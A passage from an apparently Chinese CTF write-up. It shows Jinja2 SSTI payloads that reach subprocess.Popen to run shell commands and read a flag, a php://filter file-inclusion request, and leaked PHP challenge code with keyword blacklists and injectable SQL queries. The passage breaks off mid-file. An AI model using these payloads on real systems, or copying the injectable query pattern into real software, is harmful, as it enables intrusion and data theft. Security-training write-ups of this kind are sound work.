&#x27;wrapper_descriptor&#x27;&gt;,&lt;type &#x27;instance&#x27;&gt;,&lt;type &#x27;ellipsis&#x27;&gt;,&lt;type &#x27;member_descriptor&#x27;&gt;,&lt;type &#x27;file&#x27;&gt;,&lt;type &#x27;PyCapsule&#x27;&gt;,&lt;type &#x27;cell&#x27;&gt;,&lt;type &#x27;callable-iterator&#x27;&gt;,&lt;type &#x27;iterator&#x27;&gt;,&lt;type &#x27;sys.long_info&#x27;&gt;,&lt;type &#x27;sys.float_info&#x27;&gt;,&lt;type &#x27;EncodingMap&#x27;&gt;,&lt;type &#x27;fieldnameiterator&#x27;&gt;,&lt;type &#x27;formatteriterator&#x27;&gt;,&lt;type &#x27;sys.version_info&#x27;&gt;,&lt;type &#x27;sys.flags&#x27;&gt;,&lt;type &#x27;exceptions.BaseException&#x27;&gt;,&lt;type &#x27;module&#x27;&gt;,&lt;type &#x27;imp.NullImporter&#x27;&gt;,&lt;type &#x27;zipimport.zipimporter&#x27;&gt;,&lt;type &#x27;posix.stat_result&#x27;&gt;,&lt;type &#x27;posix.statvfs_result&#x27;&gt;,&lt;class &#x27;warnings.WarningMessage&#x27;&gt;,&lt;class &#x27;warnings.catch_warnings&#x27;&gt;,&lt;class &#x27;_weakrefset._IterationGuard&#x27;&gt;,&lt;class &#x27;_weakrefset.WeakSet&#x27;&gt;,&lt;class &#x27;_abcoll.Hashable&#x27;&gt;,&lt;type &#x27;classmethod&#x27;&gt;,&lt;class &#x27;_abcoll.Iterable&#x27;&gt;,&lt;class &#x27;_abcoll.Sized&#x27;&gt;,&lt;class &#x27;_abcoll.Container&#x27;&gt;,&lt;class &#x27;_abcoll.Callable&#x27;&gt;,&lt;type &#x27;dict_keys&#x27;&gt;,&lt;type &#x27;dict_items&#x27;&gt;,&lt;type &#x27;dict_values&#x27;&gt;,&lt;class &#x27;site._Printer&#x27;&gt;,&lt;class &#x27;site._Helper&#x27;&gt;,&lt;type &#x27;_sre.SRE_Pattern&#x27;&gt;,&lt;type &#x27;_sre.SRE_Match&#x27;&gt;,&lt;type &#x27;_sre.SRE_Scanner&#x27;&gt;,&lt;class &#x27;site.Quitter&#x27;&gt;,&lt;class &#x27;codecs.IncrementalEncoder&#x27;&gt;,&lt;class &#x27;codecs.IncrementalDecoder&#x27;&gt;,&lt;class &#x27;string.Template&#x27;&gt;,&lt;class &#x27;string.Formatter&#x27;&gt;,&lt;type &#x27;collections.deque&#x27;&gt;,&lt;type &#x27;deque_iterator&#x27;&gt;,&lt;type &#x27;deque_reverse_iterator&#x27;&gt;,&lt;type &#x27;operator.itemgetter&#x27;&gt;,&lt;type &#x27;operator.attrgetter&#x27;&gt;,&lt;type &#x27;operator.methodcaller&#x27;&gt;,&lt;type &#x27;itertools.combinations&#x27;&gt;,&lt;type &#x27;itertools.combinations_with_replacement&#x27;&gt;,&lt;type &#x27;itertools.cycle&#x27;&gt;,&lt;type &#x27;itertools.dropwhile&#x27;&gt;,&lt;type &#x27;itertools.takewhile&#x27;&gt;,&lt;type &#x27;itertools.islice&#x27;&gt;,&lt;type &#x27;itertools.starmap&#x27;&gt;,&lt;type &#x27;itertools.imap&#x27;&gt;,&lt;type &#x27;itertools.chain&#x27;&gt;,&lt;type &#x27;itertools.compress&#x27;&gt;,&lt;type &#x27;itertools.ifilter&#x27;&gt;,&lt;type &#x27;itertools.ifilterfalse&#x27;&gt;,&lt;type &#x27;itertools.count&#x27;&gt;,&lt;type &#x27;itertools.izip&#x27;&gt;,&lt;type &#x27;itertools.izip_longest&#x27;&gt;,&lt;type &#x27;itertools.permutations&#x27;&gt;,&lt;type &#x27;itertools.product&#x27;&gt;,&lt;type &#x27;itertools.repeat&#x27;&gt;,&lt;type &#x27;itertools.groupby&#x27;&gt;,&lt;type &#x27;itertools.tee_dataobject&#x27;&gt;,&lt;type &#x27;itertools.tee&#x27;&gt;,&lt;type &#x27;itertools._grouper&#x27;&gt;,&lt;type &#x27;_thread._localdummy&#x27;&gt;,&lt;type &#x27;thread._local&#x27;&gt;,&lt;type &#x27;thread.lock&#x27;&gt;,&lt;type &#x27;method_descriptor&#x27;&gt;,&lt;class &#x27;markupsafe._MarkupEscapeHelper&#x27;&gt;,&lt;type &#x27;_io._IOBase&#x27;&gt;,&lt;type &#x27;_io.IncrementalNewlineDecoder&#x27;&gt;,&lt;type &#x27;_hashlib.HASH&#x27;&gt;,&lt;type &#x27;_random.Random&#x27;&gt;,&lt;type &#x27;cStringIO.StringO&#x27;&gt;,&lt;type &#x27;cStringIO.StringI&#x27;&gt;,&lt;type &#x27;cPickle.Unpickler&#x27;&gt;,&lt;type &#x27;cPickle.Pickler&#x27;&gt;,&lt;type &#x27;functools.partial&#x27;&gt;,&lt;type &#x27;_ssl._SSLContext&#x27;&gt;,&lt;type &#x27;_ssl._SSLSocket&#x27;&gt;,&lt;class &#x27;socket._closedsocket&#x27;&gt;,&lt;type &#x27;_socket.socket&#x27;&gt;,&lt;class &#x27;socket._socketobject&#x27;&gt;,&lt;class &#x27;socket._fileobject&#x27;&gt;,&lt;type &#x27;time.struct_time&#x27;&gt;,&lt;type &#x27;Struct&#x27;&gt;,&lt;class &#x27;urlparse.ResultMixin&#x27;&gt;,&lt;class &#x27;contextlib.GeneratorContextManager&#x27;&gt;,&lt;class &#x27;contextlib.closing&#x27;&gt;,&lt;type &#x27;_json.Scanner&#x27;&gt;,&lt;type &#x27;_json.Encoder&#x27;&gt;,&lt;class &#x27;json.decoder.JSONDecoder&#x27;&gt;,&lt;class &#x27;json.encoder.JSONEncoder&#x27;&gt;,&lt;class &#x27;threading._Verbose&#x27;&gt;,&lt;class &#x27;jinja2.utils.MissingType&#x27;&gt;,&lt;class &#x27;jinja2.utils.LRUCache&#x27;&gt;,&lt;class &#x27;jinja2.utils.Cycler&#x27;&gt;,&lt;class &#x27;jinja2.utils.Joiner&#x27;&gt;,&lt;class &#x27;jinja2.utils.Namespace&#x27;&gt;,&lt;class &#x27;jinja2.bccache.Bucket&#x27;&gt;,&lt;class &#x27;jinja2.bccache.BytecodeCache&#x27;&gt;,&lt;class &#x27;jinja2.nodes.EvalContext&#x27;&gt;,&lt;class &#x27;jinja2.visitor.NodeVisitor&#x27;&gt;,&lt;class &#x27;jinja2.nodes.Node&#x27;&gt;,&lt;class &#x27;jinja2.idtracking.Symbols&#x27;&gt;,&lt;class &#x27;jinja2.compiler.MacroRef&#x27;&gt;,&lt;class &#x27;jinja2.compiler.Frame&#x27;&gt;,&lt;class &#x27;jinja2.runtime.TemplateReference&#x27;&gt;,&lt;class &#x27;numbers.Number&#x27;&gt;,&lt;class &#x27;jinja2.runtime.Context&#x27;&gt;,&lt;class &#x27;jinja2.runtime.BlockReference&#x27;&gt;,&lt;class &#x27;jinja2.runtime.Macro&#x27;&gt;,&lt;class &#x27;jinja2.runtime.Undefined&#x27;&gt;,&lt;class &#x27;decimal.Decimal&#x27;&gt;,&lt;class &#x27;decimal._ContextManager&#x27;&gt;,&lt;class &#x27;decimal.Context&#x27;&gt;,&lt;class &#x27;decimal._WorkRep&#x27;&gt;,&lt;class &#x27;decimal._Log10Memoize&#x27;&gt;,&lt;type &#x27;_ast.AST&#x27;&gt;,&lt;class &#x27;ast.NodeVisitor&#x27;&gt;,&lt;class &#x27;jinja2.lexer.Failure&#x27;&gt;,&lt;class &#x27;jinja2.lexer.TokenStreamIterator&#x27;&gt;,&lt;class &#x27;jinja2.lexer.TokenStream&#x27;&gt;,&lt;class &#x27;jinja2.lexer.Lexer&#x27;&gt;,&lt;class &#x27;jinja2.parser.Parser&#x27;&gt;,&lt;class &#x27;jinja2.environment.Environment&#x27;&gt;,&lt;class &#x27;jinja2.environment.Template&#x27;&gt;,&lt;class &#x27;jinja2.environment.TemplateModule&#x27;&gt;,&lt;class &#x27;jinja2.environment.TemplateExpression&#x27;&gt;,&lt;class &#x27;jinja2.environment.TemplateStream&#x27;&gt;,&lt;class &#x27;jinja2.loaders.BaseLoader&#x27;&gt;,&lt;type &#x27;datetime.date&#x27;&gt;,&lt;type &#x27;datetime.timedelta&#x27;&gt;,&lt;type &#x27;datetime.time&#x27;&gt;,&lt;type &#x27;datetime.tzinfo&#x27;&gt;,&lt;class &#x27;logging.LogRecord&#x27;&gt;,&lt;class &#x27;logging.Formatter&#x27;&gt;,&lt;class &#x27;logging.BufferingFormatter&#x27;&gt;,&lt;class &#x27;logging.Filter&#x27;&gt;,&lt;class &#x27;logging.Filterer&#x27;&gt;,&lt;class &#x27;logging.PlaceHolder&#x27;&gt;,&lt;class &#x27;logging.Manager&#x27;&gt;,&lt;class &#x27;logging.LoggerAdapter&#x27;&gt;,&lt;class &#x27;werkzeug._internal._Missing&#x27;&gt;,&lt;class &#x27;werkzeug._internal._DictAccessorProperty&#x27;&gt;,&lt;class &#x27;werkzeug.utils.HTMLBuilder&#x27;&gt;,&lt;class &#x27;werkzeug.exceptions.Aborter&#x27;&gt;,&lt;class &#x27;werkzeug.urls.Href&#x27;&gt;,&lt;type &#x27;select.epoll&#x27;&gt;,&lt;class &#x27;click._compat._FixupStream&#x27;&gt;,&lt;class &#x27;click._compat._AtomicFile&#x27;&gt;,&lt;class &#x27;click.utils.LazyFile&#x27;&gt;,&lt;class &#x27;click.utils.KeepOpenFile&#x27;&gt;,&lt;class &#x27;click.utils.PacifyFlushWrapper&#x27;&gt;,&lt;class &#x27;click.parser.Option&#x27;&gt;,&lt;class &#x27;click.parser.Argument&#x27;&gt;,&lt;class &#x27;click.parser.ParsingState&#x27;&gt;,&lt;class &#x27;click.parser.OptionParser&#x27;&gt;,&lt;class &#x27;click.types.ParamType&#x27;&gt;,&lt;class &#x27;click.formatting.HelpFormatter&#x27;&gt;,&lt;class &#x27;click.core.Context&#x27;&gt;,&lt;class &#x27;click.core.BaseCommand&#x27;&gt;,&lt;class &#x27;click.core.Parameter&#x27;&gt;,&lt;class &#x27;werkzeug.serving.WSGIRequestHandler&#x27;&gt;,&lt;class &#x27;werkzeug.serving._SSLContext&#x27;&gt;,&lt;class &#x27;werkzeug.serving.BaseWSGIServer&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.ImmutableListMixin&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.ImmutableDictMixin&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.UpdateDictMixin&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.ViewItems&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures._omd_bucket&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.Headers&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.ImmutableHeadersMixin&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.IfRange&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.Range&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.ContentRange&#x27;&gt;,&lt;class &#x27;werkzeug.datastructures.FileStorage&#x27;&gt;,&lt;class &#x27;email.LazyImporter&#x27;&gt;,&lt;class &#x27;calendar.Calendar&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.accept.AcceptMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.auth.AuthorizationMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.auth.WWWAuthenticateMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wsgi.ClosingIterator&#x27;&gt;,&lt;class &#x27;werkzeug.wsgi.FileWrapper&#x27;&gt;,&lt;class &#x27;werkzeug.wsgi._RangeWrapper&#x27;&gt;,&lt;class &#x27;werkzeug.formparser.FormDataParser&#x27;&gt;,&lt;class &#x27;werkzeug.formparser.MultiPartParser&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.base_request.BaseRequest&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.base_response.BaseResponse&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonRequestDescriptorsMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.common_descriptors.CommonResponseDescriptorsMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.etag.ETagRequestMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.etag.ETagResponseMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.cors.CORSRequestMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.cors.CORSResponseMixin&#x27;&gt;,&lt;class &#x27;werkzeug.useragents.UserAgentParser&#x27;&gt;,&lt;class &#x27;werkzeug.useragents.UserAgent&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.user_agent.UserAgentMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.request.StreamOnlyMixin&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.response.ResponseStream&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.response.ResponseStreamMixin&#x27;&gt;,&lt;class &#x27;werkzeug.test._TestCookieHeaders&#x27;&gt;,&lt;class &#x27;werkzeug.test._TestCookieResponse&#x27;&gt;,&lt;class &#x27;werkzeug.test.EnvironBuilder&#x27;&gt;,&lt;class &#x27;werkzeug.test.Client&#x27;&gt;,&lt;class &#x27;uuid.UUID&#x27;&gt;,&lt;type &#x27;CArgObject&#x27;&gt;,&lt;type &#x27;_ctypes.CThunkObject&#x27;&gt;,&lt;type &#x27;_ctypes._CData&#x27;&gt;,&lt;type &#x27;_ctypes.CField&#x27;&gt;,&lt;type &#x27;_ctypes.DictRemover&#x27;&gt;,&lt;class &#x27;ctypes.CDLL&#x27;&gt;,&lt;class &#x27;ctypes.LibraryLoader&#x27;&gt;,&lt;class &#x27;subprocess.Popen&#x27;&gt;,&lt;class &#x27;itsdangerous._json._CompactJSON&#x27;&gt;,&lt;class &#x27;itsdangerous.signer.SigningAlgorithm&#x27;&gt;,&lt;class &#x27;itsdangerous.signer.Signer&#x27;&gt;,&lt;class &#x27;itsdangerous.serializer.Serializer&#x27;&gt;,&lt;class &#x27;itsdangerous.url_safe.URLSafeSerializerMixin&#x27;&gt;,&lt;class &#x27;flask._compat._DeprecatedBool&#x27;&gt;,&lt;class &#x27;werkzeug.local.Local&#x27;&gt;,&lt;class &#x27;werkzeug.local.LocalStack&#x27;&gt;,&lt;class &#x27;werkzeug.local.LocalManager&#x27;&gt;,&lt;class &#x27;werkzeug.local.LocalProxy&#x27;&gt;,&lt;class &#x27;difflib.HtmlDiff&#x27;&gt;,&lt;class &#x27;werkzeug.routing.RuleFactory&#x27;&gt;,&lt;class &#x27;werkzeug.routing.RuleTemplate&#x27;&gt;,&lt;class &#x27;werkzeug.routing.BaseConverter&#x27;&gt;,&lt;class &#x27;werkzeug.routing.Map&#x27;&gt;,&lt;class &#x27;werkzeug.routing.MapAdapter&#x27;&gt;,&lt;class &#x27;flask.signals.Namespace&#x27;&gt;,&lt;class &#x27;flask.signals._FakeSignal&#x27;&gt;,&lt;class &#x27;flask.helpers.locked_cached_property&#x27;&gt;,&lt;class &#x27;flask.helpers._PackageBoundObject&#x27;&gt;,&lt;class &#x27;flask.cli.DispatchingApp&#x27;&gt;,&lt;class &#x27;flask.cli.ScriptInfo&#x27;&gt;,&lt;class &#x27;flask.config.ConfigAttribute&#x27;&gt;,&lt;class &#x27;flask.ctx._AppCtxGlobals&#x27;&gt;,&lt;class &#x27;flask.ctx.AppContext&#x27;&gt;,&lt;class &#x27;flask.ctx.RequestContext&#x27;&gt;,&lt;class &#x27;flask.json.tag.JSONTag&#x27;&gt;,&lt;class &#x27;flask.json.tag.TaggedJSONSerializer&#x27;&gt;,&lt;class &#x27;flask.sessions.SessionInterface&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.json._JSONModule&#x27;&gt;,&lt;class &#x27;werkzeug.wrappers.json.JSONMixin&#x27;&gt;,&lt;class &#x27;flask.blueprints.BlueprintSetupState&#x27;&gt;,&lt;type &#x27;unicodedata.UCD&#x27;&gt;,&lt;class &#x27;jinja2.ext.Extension&#x27;&gt;,&lt;class &#x27;jinja2.ext._CommentFinder&#x27;&gt;,&lt;type &#x27;array.array&#x27;&gt;,&lt;type &#x27;method-wrapper&#x27;&gt;&quot;</span><br><span class="hljs-built_in">str</span>=<span class="hljs-built_in">str</span>.split(<span class="hljs-string">&#x27;,&#x27;</span>)<br>count=<span class="hljs-number">0</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">str</span>:<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;&lt;type&quot;</span> <span class="hljs-keyword">in</span> i <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&lt;class&quot;</span> <span class="hljs-keyword">in</span> i:<br>        count+=<span class="hljs-number">1</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;subprocess&quot;</span> <span class="hljs-keyword">in</span>  i:<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(count-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>自己写了个脚本用这个来计数</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201221921765.png" alt="image-20220122192128669"></p><p>最后有</p><figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[258](<span class="hljs-name">&#x27;ls /&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[258](<span class="hljs-name">&#x27;ls /flasklight&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><span class="xml"></span><br><span class="xml"></span><br><span class="xml">?search=</span><span class="hljs-template-variable">&#123;&#123;<span class="hljs-name">&#x27;&#x27;.__class__.__mro__</span>[2].__subclasses__()[258](<span class="hljs-name">&#x27;cat /flasklight/coomme_geeeett_youur_flek&#x27;</span>,<span class="hljs-attr">shell</span>=<span class="hljs-literal">True</span>,<span class="hljs-attr">stdout</span>=-1).communicate()[0].strip()&#125;&#125;</span><br></code></pre></td></tr></table></figure><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p>首页源码提示</p><p><code> &lt;!--?file=?--&gt;</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">index.php?file=php://filter/convert.base64-encode/resource=index.php<br></code></pre></td></tr></table></figure><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br>ini_set(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><br><span class="hljs-comment">// $file = $_GET[&quot;file&quot;];</span><br><span class="hljs-variable">$file</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-literal">null</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;no way!&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>seacrch.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>; <br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || preg_match(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123; <br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;fetch_assoc();<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$row</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            print_r(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_name&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;phone&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;未找到订单!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;信息不全&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>delete.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || preg_match(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123; <br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;fetch_assoc();<br>        <span class="hljs-variable">$result</span> = <span class="hljs-variable">$db</span>-&gt;query(<span class="hljs-string">&#x27;delete from `user` where `user_id`=&#x27;</span> . <span class="hljs-variable">$row</span>[<span class="hljs-string">&quot;user_id&quot;</span>]);<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$result</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            print_r(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;è®¢åå é¤æå&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;æªæ¾å°è®¢å!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;ä¿¡æ¯ä¸å¨&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>change.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span 